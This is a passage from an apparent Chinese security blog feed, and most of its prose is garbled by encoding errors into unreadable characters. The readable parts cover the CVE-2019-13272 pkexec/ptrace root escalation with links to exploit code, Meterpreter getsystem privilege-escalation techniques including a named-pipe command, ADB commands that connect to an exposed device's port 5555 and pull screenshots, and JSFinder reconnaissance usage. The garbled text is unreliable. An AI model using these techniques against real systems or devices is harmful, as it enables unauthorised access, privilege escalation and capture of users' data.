class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç ”ç©¶äººå‘˜æ¦‚è¿°çš„è¿™æ ·ä¸€ä¸ªæ”»å‡»åœºæ™¯ï¼š</p><blockquote><p>æ¶‰åŠä¸€ä¸ªçˆ¶è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¿™ä¸ªå­è¿›ç¨‹ä¼šå†åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ã€‚ç¬¬ä¸€ä¸ªå­è¿›ç¨‹ä½¿ç”¨å‘½ä»¤pkexecï¼ˆç”¨äºä»¥rootèº«ä»½è¿è¡Œç¨‹åºï¼‰ï¼Œç¬¬äºŒä¸ªå­è¿›ç¨‹è¿è¡ŒPTRACE_TRACEMEï¼Œç„¶åç¬¬ä¸€ä¸ªå­è¿›ç¨‹ä¸¢å¼ƒå…¶æƒé™ï¼ˆç†è§£ä¸ºé™æƒï¼Œä»¥å‰æƒé™å¾ˆé«˜ï¼Œç„¶åè¢«é™äº†ï¼‰ã€‚æœ€ç»ˆç»“æœæ˜¯çˆ¶è¿›ç¨‹å¯ä»¥ä½¿ç”¨ptraceæ¥æ§åˆ¶ç¬¬ä¸€ä¸ªå­è¿›ç¨‹ï¼Œåè€…å¯ä»¥ä½¿ç”¨ptraceæ¥æ§åˆ¶ç¬¬äºŒä¸ªå­è¿›ç¨‹ - ä»è€Œè®©æ”»å‡»è€…è·å¾—å¯¹ä¸¤ä¸ªè¿›ç¨‹çš„æ§åˆ¶æƒã€‚</p></blockquote><p>æˆ‘ä»¬ä¸å¦¨æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªåœºæ™¯ï¼šï¼ˆåˆ©ç”¨æ€è·¯å°±æ˜¯åˆ©ç”¨çˆ¶å­è¿›ç¨‹æ¥è·å¾—rootç”¨æˆ·è®¿é—®æƒé™ï¼ˆå‡­æ®ï¼‰ï¼‰</p><blockquote><p>é¦–å…ˆçˆ¶è¿›ç¨‹forkå‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹1åˆforkå‡ºç›¸å¯¹äºå®ƒçš„å­è¿›ç¨‹2ï¼Œå­è¿›ç¨‹1æœ‰ç€é«˜æƒé™ï¼ˆå¾ˆç‰›é€¼ï¼Œæ— æ‰€ä¸èƒ½ï¼Œæˆ‘å°±æ˜¯rootï¼‰ï¼Œå­è¿›ç¨‹äºŒè¿è¡Œç€PTRACE_TRACEMEï¼Œåé¢çœŸæ­£çš„rootçœ‹ç€å­è¿›ç¨‹1ä¸çˆ½ï¼ˆä½ å‡­ä»€ä¹ˆæ‹¥æœ‰å’Œæˆ‘ä¸€æ ·çš„æƒé™å•Šï¼Œä½ ä¹Ÿä¸çœ‹çœ‹ä½ ä»€ä¹ˆèº«ä»½ï¼‰ï¼Œç„¶åå°±æŠŠå­è¿›ç¨‹1é™æƒäº†ï¼Œä½†æ˜¯è¿è¡Œç€PTRACE_TRACEMEçš„å­è¿›ç¨‹2æ‚„æ‚„çš„æŠŠå­è¿›ç¨‹1é«˜æƒé™çš„å‡­è¯ç»™è®°å½•ä¸‹æ¥äº†ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡çˆ¶è¿›ç¨‹å»ptraceå­è¿›ç¨‹1ï¼Œå†å»ptraceå­è¿›ç¨‹2ï¼Œå› ä¸ºå­è¿›ç¨‹äºŒè®°å½•ç€rootçš„å‡­æ®ï¼Œç„¶åæˆ‘ä»¬ä»¥æ­¤æ¥æ‰§è¡Œrootæƒé™çš„ä»»æ„ä»£ç ã€‚</p></blockquote><p>expä¸­åˆ©ç”¨æ€è·¯å°±æ˜¯æ˜¯ç›´æ¥è®©å­è¿›ç¨‹1å»æ‰§è¡Œå¸¦æœ‰PTRACE_TRACEMEçš„Polkitçš„pkexecï¼ˆå¾ˆéš¾ç†è§£ï¼Œä½†æ˜¯åé¢çœ‹äº†Polkitä»¥åŠexpï¼Œå¥½åƒåˆç†è§£äº†ï¼‰</p><p>æˆ‘åˆ†æèµ·æ¥éƒ½æ„Ÿåˆ°å¾ˆé¸¡è‚‹ï¼Œå®é™…åˆ©ç”¨ä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œå‡å®šå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶çˆ¶è¿›ç¨‹ï¼ˆçˆ¶è¿›ç¨‹æœ€å…ˆå¼€å§‹é«˜æƒé™ï¼Œè¿è¡Œptraceåˆ°å­è¿›ç¨‹ï¼Œç„¶åè¢«å…¶å­è¿›ç¨‹è¿è¡Œçš„PTRACE_TRACEMEè®°å½•ä¸‹æ¥äº†çˆ¶è¿›ç¨‹é«˜æƒé™çš„å‡­æ®ï¼Œåé¢çˆ¶è¿›ç¨‹è¢«é™æƒäº†ï¼‰ï¼Œç„¶åé€šè¿‡ptraceåˆ°å­è¿›ç¨‹è·å¾—é«˜æƒé™å‡­æ®ï¼Œç„¶åæ‰§è¡Œä»£ç ã€‚</p><h2 id="1-ptraceæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#1-ptraceæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1.ptraceæ˜¯ä»€ä¹ˆï¼Ÿ"></a>1.ptraceæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>å¦‚æœäº†è§£è¿‡é€†å‘å·¥ç¨‹çš„å°ä¼™ä¼´ï¼Œè‚¯å®šå¯¹è¿™ä¸ªptraceä¸é™Œç”Ÿï¼Œå› ä¸ºè¿™æ˜¯åè°ƒè¯•æŠ€æœ¯ä¸­çš„åŸºç¡€å…¥é—¨æ‰‹æ®µï¼Œè™½ç„¶ç°åœ¨è¯¸å¦‚ä»£ç è™šæ‹ŸåŒ–ä¹‹ç±»çš„å…¶ä»–é˜²é€†å‘æŠ€æœ¯å·²ç»å¾ˆæˆç†Ÿäº†ï¼Œä½†æ˜¯ptraceä»ç„¶æ˜¯ä¸€äº›å•†ä¸šè½¯ä»¶äº§å“ä¸­ä½¿ç”¨ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å…¥é—¨åè°ƒè¯•æ‰€å¿…é¡»çš„åŸºç¡€æŠ€æœ¯ï¼</p><p>Ptrace å¯ä»¥è®©çˆ¶è¿›ç¨‹æ§åˆ¶å­è¿›ç¨‹è¿è¡Œï¼Œå¹¶å¯ä»¥æ£€æŸ¥å’Œæ”¹å˜å­è¿›ç¨‹çš„æ ¸å¿ƒimageçš„åŠŸèƒ½ï¼ˆPeek and poke åœ¨ç³»ç»Ÿç¼–ç¨‹ä¸­æ˜¯å¾ˆçŸ¥åçš„å«æ³•ï¼ŒæŒ‡çš„æ˜¯ç›´æ¥è¯»å†™å†…å­˜å†…å®¹ï¼‰ã€‚ptraceä¸»è¦è·Ÿè¸ªçš„æ˜¯è¿›ç¨‹è¿è¡Œæ—¶çš„çŠ¶æ€ï¼Œç›´åˆ°æ”¶åˆ°ä¸€ä¸ªç»ˆæ­¢ä¿¡å·ç»“æŸè¿›ç¨‹ï¼Œè¿™é‡Œçš„ä¿¡å·å¦‚æœæ˜¯æˆ‘ä»¬ç»™ç¨‹åºè®¾ç½®çš„æ–­ç‚¹ï¼Œåˆ™è¿›ç¨‹è¢«ä¸­æ­¢ï¼Œå¹¶ä¸”é€šçŸ¥å…¶çˆ¶è¿›ç¨‹ï¼Œåœ¨è¿›ç¨‹ä¸­æ­¢çš„çŠ¶æ€ä¸‹ï¼Œè¿›ç¨‹çš„å†…å­˜ç©ºé—´å¯ä»¥è¢«è¯»å†™ã€‚å½“ç„¶çˆ¶è¿›ç¨‹è¿˜å¯ä»¥ä½¿å­è¿›ç¨‹ç»§ç»­æ‰§è¡Œï¼Œå¹¶é€‰æ‹©æ˜¯å¦å¿½ç•¥å¼•èµ·ä¸­æ­¢çš„ä¿¡å·ï¼Œptraceå¯ä»¥è®©ä¸€ä¸ªè¿›ç¨‹ç›‘è§†å’Œæ§åˆ¶å¦ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œ,å¹¶ä¸”ä¿®æ”¹è¢«ç›‘è§†è¿›ç¨‹çš„å†…å­˜ã€å¯„å­˜å™¨ç­‰,ä¸»è¦åº”ç”¨äºæ–­ç‚¹è°ƒè¯•å’Œç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªï¼Œstraceå’Œgdbå·¥å…·å°±æ˜¯åŸºäºptraceç¼–å†™çš„ï¼</p><p>ptraceåœ¨linux åè°ƒè¯•æŠ€æœ¯ä¸­çš„åœ°ä½å°±å¦‚åŒncåœ¨å®‰å…¨ç•Œçš„åœ°ä½ï¼Œç‘å£«å†›åˆ€å•Š!</p><p>ptraceä½¿ç”¨åœºæ™¯ï¼š<br>1.ç¼–å†™åŠ¨æ€åˆ†æå·¥å…·ï¼Œå¦‚gdb,strace<br>2.åè¿½è¸ªï¼Œä¸€ä¸ªè¿›ç¨‹åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹è¿½è¸ª(æ³¨ï¼šä¸€ä¸ªè¿›ç¨‹èƒ½åŒæ—¶è¿½è¸ªå¤šä¸ªè¿›ç¨‹)ï¼Œè‹¥æ­¤è¿›ç¨‹å·²è¢«è¿½è¸ªï¼Œå…¶ä»–åŸºäºptraceçš„è¿½è¸ªå™¨å°†æ— æ³•å†è¿½è¸ªæ­¤è¿›ç¨‹ï¼Œæ›´è¿›ä¸€æ­¥å¯ä»¥å®ç°å­æ¯è¿›ç¨‹åŒçº¿æ‰§è¡ŒåŠ¨æ€è§£å¯†ä»£ç ç­‰æ›´é«˜çº§çš„ååˆ†ææŠ€æœ¯<br>3.ä»£ç æ³¨å…¥ï¼Œå¾€å…¶ä»–è¿›ç¨‹é‡Œæ³¨å…¥ä»£ç ã€‚<br>4.ä¸é€€å‡ºè¿›ç¨‹ï¼Œè¿›è¡Œåœ¨çº¿å‡çº§ã€‚</p><p>è€Œptrace_tracemeå°±æ˜¯å‘Šè¯‰çˆ¶è¿›ç¨‹å°±å­—é¢æ„æ€è·Ÿè¸ªæˆ‘å§ã€‚</p><h2 id="2-ä»€ä¹ˆæ˜¯pakexecï¼Ÿ"><a href="#2-ä»€ä¹ˆæ˜¯pakexecï¼Ÿ" class="headerlink" title="2.ä»€ä¹ˆæ˜¯pakexecï¼Ÿ"></a>2.ä»€ä¹ˆæ˜¯pakexecï¼Ÿ</h2><p>æè¿°ï¼špkexecæ˜¯linuxå·¦é¢freedestopä¸Šçš„éªŒè¯ç¨‹åºï¼Œpkexecå…è®¸æˆæƒç”¨æˆ·ä»¥PROGRAMå…¶ä»–ç”¨æˆ·èº«ä»½æ‰§è¡Œã€‚å¦‚æœusernameæœªæŒ‡å®šï¼Œåˆ™è¯¥ç¨‹åºå°†ä»¥ç®¡ç†è¶…çº§ç”¨æˆ·rootçš„èº«ä»½æ‰§è¡Œï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹éœ€è¦ç®¡ç†å‘˜æˆæƒã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼špkexecæ˜¯ç›´æ¥å¸¦æœ‰PTRACE_TRACEMEçš„Polkit</p><p>Polkitæ˜¯ä»€ä¹ˆï¼Ÿ</p><blockquote><p>æ˜¯ç”¨äºåœ¨ç±»ä¼¼Unixçš„æ“ä½œç³»ç»Ÿä¸­æ§åˆ¶ç³»ç»ŸèŒƒå›´ç‰¹æƒçš„ç»„ä»¶ï¼Œå®ƒä¸ºéç‰¹æƒè¿›ç¨‹æä¾›äº†ä¸€ç§ä¸ç‰¹æƒè¿›ç¨‹è¿›è¡Œé€šä¿¡çš„æœ‰ç»„ç»‡æ–¹å¼ã€‚</p></blockquote><p>æ¼æ´åˆ©ç”¨ä»£ç ä¸­ä¹Ÿæ˜¯ç”¨çš„pkexec</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2834510010.png"></p><h2 id="æ¼æ´åˆ©ç”¨æ¡ä»¶"><a href="#æ¼æ´åˆ©ç”¨æ¡ä»¶" class="headerlink" title="æ¼æ´åˆ©ç”¨æ¡ä»¶"></a>æ¼æ´åˆ©ç”¨æ¡ä»¶</h2><p>æ‰€ä»¥è¯´è¿™ä¸ªæ¼æ´åˆ©ç”¨æ¡ä»¶æœ‰ä¸¤ç‚¹ï¼š<br>1.æ‰¾suidé™æƒçš„ç¨‹åºï¼ˆæˆ‘ä»¬èƒ½æ§åˆ¶çš„ï¼Œå¦‚pkexecï¼‰<br>2.å¦‚æœåˆ©ç”¨pkexecï¼ˆåˆ©ç”¨æ¡ä»¶ä¸ºæ¡Œé¢çš„ç»ˆç«¯linuxï¼Œé€šè¿‡SSHä¼šè¯åˆ©ç”¨æ­¤æ¼æ´ä¸æˆåŠŸï¼‰</p><p>expç”¨çš„å°±æ˜¯pkexecï¼Œä¸ºä»€ä¹ˆç”¨pkexecï¼Œå› ä¸ºåœ¨pkexecæ¶‰åŠåˆ°é™æƒçš„è¡Œä¸ºï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªå·±æŸ¥èµ„æ–™ç»“åˆexpçœ‹çœ‹</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>expæ•´ä½“åˆ©ç”¨é€»è¾‘<br>1.çˆ¶è¿›ç¨‹ç”Ÿæˆå­è¿›ç¨‹1<br>2.å­è¿›ç¨‹1ç”Ÿæˆçˆ¶è¿›ç¨‹2<br>3.å­è¿›ç¨‹1æ‰§è¡Œsuidç¨‹åºpkexec<br>4.å­è¿›ç¨‹2è¿è¡Œptrace_traceme<br>5.çˆ¶è¿›ç¨‹ä¿®æ”¹å­è¿›ç¨‹1å†…å­˜ï¼Œptraceåˆ°å­è¿›ç¨‹2ç„¶åå†ä¿®æ”¹å­è¿›ç¨‹2æ‰§è¡Œä»»æ„ä»£ç ï¼ˆå­è¿›ç¨‹äºŒä¸ºrootæƒé™ï¼‰</p><p>expåœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;47163</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;k8gege&#x2F;K8tools&#x2F;blob&#x2F;master&#x2F;CVE-2019-13272.c</span><br></pre></td></tr></table></figure><p>gccæ­£å¸¸ç¼–è¯‘å°±è¡Œäº†</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å½“è¾“å…¥getsystemä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</title>
      <link href="2021/01/27/%E5%BD%93%E8%BE%93%E5%85%A5getsystem%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88/"/>
      <url>2021/01/27/%E5%BD%93%E8%BE%93%E5%85%A5getsystem%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<blockquote><p>â€œMeterpreterçš„getsystemå‘½ä»¤æ˜¯éå¸¸niceçš„ï¼åœ¨è¾“å…¥getsystemçš„å‘½ä»¤ä¹‹åï¼ŒMeterpreterå°±ä¼šç¥å¥‡çš„å°†æƒé™ä»æœ¬åœ°ç®¡ç†å‘˜æå‡ä¸ºSYSTEMç”¨æˆ·ã€‚â€</p></blockquote><h3 id="åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆäº‹ï¼Ÿ"><a href="#åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆäº‹ï¼Ÿ" class="headerlink" title="åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆäº‹ï¼Ÿ"></a><strong>åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆäº‹ï¼Ÿ</strong></h3><p>getsystemå‘½ä»¤åŒ…å«æœ‰ä¸‰ç§æŠ€æœ¯ï¼Œå‰ä¸¤ä¸ªåŸºäºå‘½åç®¡é“æ¨¡æ‹Ÿï¼Œæœ€åä¸€ä¸ªä¾é ä»¤ç‰Œå¤åˆ¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem -h</span><br><span class="line">Usage: getsystem [options]</span><br><span class="line"> </span><br><span class="line">Attempt to elevate your privilege to that of local system.</span><br><span class="line"> </span><br><span class="line">OPTIONS:</span><br><span class="line"> </span><br><span class="line">    -h        Help Banner.</span><br><span class="line">    -t   The technique to use. (Default to &#39;0&#39;).</span><br><span class="line">        0 : All techniques available</span><br><span class="line">        1 : Service - Named Pipe Impersonation (In Memory&#x2F;Admin)</span><br><span class="line">        2 : Service - Named Pipe Impersonation (Dropper&#x2F;Admin)</span><br><span class="line">        3 : Service - Token Duplication (In Memory&#x2F;Admin)</span><br></pre></td></tr></table></figure><hr><h3 id="è®©æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹åŸç†ï¼š"><a href="#è®©æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹åŸç†ï¼š" class="headerlink" title="è®©æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹åŸç†ï¼š"></a><strong>è®©æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹åŸç†ï¼š</strong></h3><h5 id="æŠ€æœ¯-1"><a href="#æŠ€æœ¯-1" class="headerlink" title="æŠ€æœ¯ 1"></a><strong>æŠ€æœ¯ 1</strong></h5><p>Meterpreterå°†åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œå¹¶ä¸”è¿˜åˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªæœåŠ¡ï¼Œè¯¥æœåŠ¡è¿è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c echo â€œsome dataâ€ &gt; \\.\pipe\[random pipe here]</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„cmd.exeè¿æ¥åˆ°Meterpreterçš„å‘½åç®¡é“æ—¶ï¼ŒMeterpreterå°†æœ‰æœºä¼šæ¨¡æ‹Ÿè¯¥æœåŠ¡å®‰å…¨ä¸Šä¸‹æ–‡ï¼ˆæ¨¡ä»¿å®¢æˆ·ç«¯æ˜¯ä¸€ä¸ªå‘½åç®¡é“åŠŸèƒ½)ï¼ŒæœåŠ¡çš„ä¸Šä¸‹æ–‡æ˜¯SYSTEMæƒé™ï¼Œæ‰€ä»¥å°†è·å¾—SYSTEMæƒé™ã€‚</p><h5 id="æŠ€æœ¯-2"><a href="#æŠ€æœ¯-2" class="headerlink" title="æŠ€æœ¯ 2"></a><strong>æŠ€æœ¯ 2</strong></h5><p>ç±»ä¼¼äºæŠ€æœ¯1ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªå‘½åç®¡é“å¹¶æ¨¡æ‹Ÿç¬¬ä¸€ä¸ªå®¢æˆ·ç«¯çš„æœåŠ¡å®‰å…¨ä¸Šä¸‹æ–‡å¹¶ä¸å…¶è¿æ¥ã€‚è‹¥è¦ä½¿ç”¨SYSTEMç”¨æˆ·ä¸Šä¸‹æ–‡åˆ›å»ºå®¢æˆ·ç«¯ï¼Œæ­¤æŠ€æœ¯å°†DLLæ‹–æ”¾åˆ°ç£ç›˜ä¸Šï¼Œå¹¶å°†rundll32.exeå®‰æ’ä¸ºæœåŠ¡ï¼Œä»¥å°†DLLä½œä¸ºSYSTEMè¿è¡Œï¼Œç„¶åå°†DLLè¿æ¥åˆ°å‘½åç®¡é“ï¼Œè·å¾—SYSTEMæƒé™ã€‚</p><p>æ„Ÿå…´è¶£å¾—å¯ä»¥çœ‹çœ‹elevate_via_service_namedpipe2åœ¨Meterpreterçš„æºä»£ç ï¼Œç ”ç©¶ä¸€ä¸‹è¿™ç§æŠ€æœ¯ã€‚<strong>æ³¨æ„ï¼š</strong>è¯¥æŠ€æœ¯å°†æ–‡ä»¶æ‹–æ”¾åˆ°ç£ç›˜ä¸Šã€‚è¿™ä¹Ÿæ˜¯åç—…æ¯’æœ¨é©¬è½¯ä»¶æŸ¥æ€çš„ä¾æ®ã€‚</p><h5 id="æŠ€æœ¯-3"><a href="#æŠ€æœ¯-3" class="headerlink" title="æŠ€æœ¯ 3"></a><strong>æŠ€æœ¯ 3</strong></h5><p>è¯¥æŠ€æœ¯å°†å‡å®šå½“å‰èƒ½ä½¿ç”¨SeDebugPrivileges-getprivsï¼Œå®ƒå°†éå†æ‰€æœ‰æ‰“å¼€çš„æœåŠ¡ï¼Œä»¥æ‰¾åˆ°ä»¥SYSTEMèº«ä»½è¿è¡Œä¸”æœ‰æƒæ³¨å…¥çš„æœåŠ¡ã€‚å¦‚æœæ‰¾åˆ°äº†ï¼Œå®ƒå°†ä½¿ç”¨åå°„æ€§DLLæ³¨å…¥æŠ€æœ¯åœ¨æ‰¾åˆ°çš„æœåŠ¡çš„å†…å­˜ç©ºé—´ä¸­è¿è¡Œlifter.dllï¼Œè¿™æ—¶å€™ä¼šå°†å½“å‰çº¿ç¨‹IDï¼ˆæ¥è‡ªMeterpreterï¼‰ä¼ é€’ç»™lift.dllï¼Œlift.dllè¿è¡Œæ—¶ï¼Œlifter.dllä¼šè·å–SYSTEMä»¤ç‰Œï¼Œåœ¨Meterpreterä¸­æ‰“å¼€ä¸»çº¿ç¨‹ï¼Œç„¶åå°è¯•å°†SYSTEMä»¤ç‰Œåº”ç”¨äºè¯¥çº¿ç¨‹ã€‚è¯¥æŠ€æœ¯çš„å®ç°ä»…é™äºx86ç¯å¢ƒï¼Œä»éšè—çš„æ–¹é¢æ¥è®²ï¼Œå®ƒä¸éœ€è¦äº§ç”Ÿæ–°çš„è¿‡ç¨‹ï¼Œå®ƒå®Œå…¨åœ¨å†…å­˜ä¸­è¿›è¡Œï¼ŒåŠ¨é™å¾ˆå°ã€‚</p><h3 id="ä¸“ä¸šåè¯å‚è€ƒé“¾æ¥"><a href="#ä¸“ä¸šåè¯å‚è€ƒé“¾æ¥" class="headerlink" title="ä¸“ä¸šåè¯å‚è€ƒé“¾æ¥"></a><strong>ä¸“ä¸šåè¯å‚è€ƒé“¾æ¥</strong></h3><blockquote><p>å®‰å…¨ä¸Šä¸‹æ–‡ï¼š<a href="https://blog.csdn.net/lixinms/article/details/5148622">https://blog.csdn.net/lixinms/article/details/5148622</a><br>å‘½åç®¡é“ï¼š<a href="https://www.anquanke.com/post/id/190207#h3-7">https://www.anquanke.com/post/id/190207#h3-7</a><br>åå°„DLLæ³¨å…¥ï¼š<a href="https://www.cnblogs.com/h2zZhou/p/7721797.html">https://www.cnblogs.com/h2zZhou/p/7721797.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡adbä½¿ç”¨</title>
      <link href="2021/01/25/%E8%AE%B0%E4%B8%80%E6%AC%A1adb%E4%BD%BF%E7%94%A8/"/>
      <url>2021/01/25/%E8%AE%B0%E4%B8%80%E6%AC%A1adb%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>adbå¯¹5555ç«¯å£çš„åˆ©ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\adb.exe connect IP    è¿æ¥</span><br><span class="line">.\adb devices    æŸ¥çœ‹</span><br><span class="line">.\adb shell screencap -p &#x2F;sdcard&#x2F;screen.png        æˆªå›¾</span><br><span class="line">.\adb pull &#x2F;sdcard&#x2F;screen.png    ä¼ å›</span><br><span class="line">.\adb.exe disconnect IP        æ–­å¼€</span><br><span class="line">......</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> adb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çœŸé¦™ç³»åˆ—-JSFinderå®ç”¨æ”¹é€ </title>
      <link href="2021/01/21/%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-JSFinder%E5%AE%9E%E7%94%A8%E6%94%B9%E9%80%A0/"/>
      <url>2021/01/21/%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-JSFinder%E5%AE%9E%E7%94%A8%E6%94%B9%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>JSFinderæ˜¯ä¸€æ¬¾ä¼˜ç§€çš„githubå¼€æºå·¥å…·ï¼Œè¿™æ¬¾å·¥å…·åŠŸèƒ½å°±æ˜¯æŸ¥æ‰¾éšè—åœ¨jsæ–‡ä»¶ä¸­çš„apiæ¥å£å’Œæ•æ„Ÿç›®å½•ï¼Œä»¥åŠä¸€äº›å­åŸŸåã€‚</p><p>githubé“¾æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Threezh1&#x2F;JSFinder</span><br></pre></td></tr></table></figure><p>ç”¨äºæå–çš„æ­£åˆ™è¡¨è¾¾å¼å‚è€ƒäº†LinkFinder<br>SFinderè·å–URLå’Œå­åŸŸåçš„æ–¹å¼ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/663556067.png"></p><h1 id="ä¸€äº›ç®€å•çš„ä½¿ç”¨æ–¹å¼ï¼š"><a href="#ä¸€äº›ç®€å•çš„ä½¿ç”¨æ–¹å¼ï¼š" class="headerlink" title="ä¸€äº›ç®€å•çš„ä½¿ç”¨æ–¹å¼ï¼š"></a>ä¸€äº›ç®€å•çš„ä½¿ç”¨æ–¹å¼ï¼š</h1><h4 id="ç®€å•çˆ¬å–"><a href="#ç®€å•çˆ¬å–" class="headerlink" title="ç®€å•çˆ¬å–"></a>ç®€å•çˆ¬å–</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -u http:&#x2F;&#x2F;www.mi.com</span><br><span class="line"></span><br><span class="line">#è¿™ä¸ªå‘½ä»¤ä¼šçˆ¬å– http:&#x2F;&#x2F;www.mi.com è¿™å•ä¸ªé¡µé¢çš„æ‰€æœ‰çš„jsé“¾æ¥ï¼Œå¹¶åœ¨å…¶ä¸­å‘ç°urlå’Œå­åŸŸå</span><br></pre></td></tr></table></figure><h4 id="æ·±åº¦çˆ¬å–"><a href="#æ·±åº¦çˆ¬å–" class="headerlink" title="æ·±åº¦çˆ¬å–"></a>æ·±åº¦çˆ¬å–</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -u http:&#x2F;&#x2F;www.mi.com -d</span><br><span class="line"></span><br><span class="line">#æ·±å…¥ä¸€å±‚é¡µé¢çˆ¬å–JSï¼Œæ—¶é—´ä¼šæ¶ˆè€—çš„æ›´é•¿,å»ºè®®ä½¿ç”¨-ou å’Œ -osæ¥æŒ‡å®šä¿å­˜URLå’Œå­åŸŸåçš„æ–‡ä»¶å</span><br><span class="line">python JSFinder.py -u http:&#x2F;&#x2F;www.mi.com -d -ou mi_url.txt -os mi_subdomain.txt</span><br></pre></td></tr></table></figure><h4 id="æ‰¹é‡æŒ‡å®šURL-æŒ‡å®šJS"><a href="#æ‰¹é‡æŒ‡å®šURL-æŒ‡å®šJS" class="headerlink" title="æ‰¹é‡æŒ‡å®šURL/æŒ‡å®šJS"></a>æ‰¹é‡æŒ‡å®šURL/æŒ‡å®šJS</h4><p>æŒ‡å®šURLï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -f text.txt</span><br></pre></td></tr></table></figure><p>æŒ‡å®šJSï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -f text.txt -j</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨brupsuiteçˆ¬å–ç½‘ç«™åæå–å‡ºURLæˆ–è€…JSé“¾æ¥ï¼Œä¿å­˜åˆ°txtæ–‡ä»¶ä¸­ï¼Œä¸€è¡Œä¸€ä¸ªã€‚<br>æŒ‡å®šURLæˆ–JSå°±ä¸éœ€è¦åŠ æ·±åº¦çˆ¬å–ï¼Œå•ä¸ªé¡µé¢å³å¯,ç­‰ç­‰ï¼Œè¿™å¯ä»¥å»githubä¸Šé¢çœ‹ä½¿ç”¨è¯´æ˜ã€‚</p><h1 id="æ”¹é€ "><a href="#æ”¹é€ " class="headerlink" title="æ”¹é€ "></a>æ”¹é€ </h1><h2 id="1-ä¸ºä»€ä¹ˆè¦æ”¹é€ 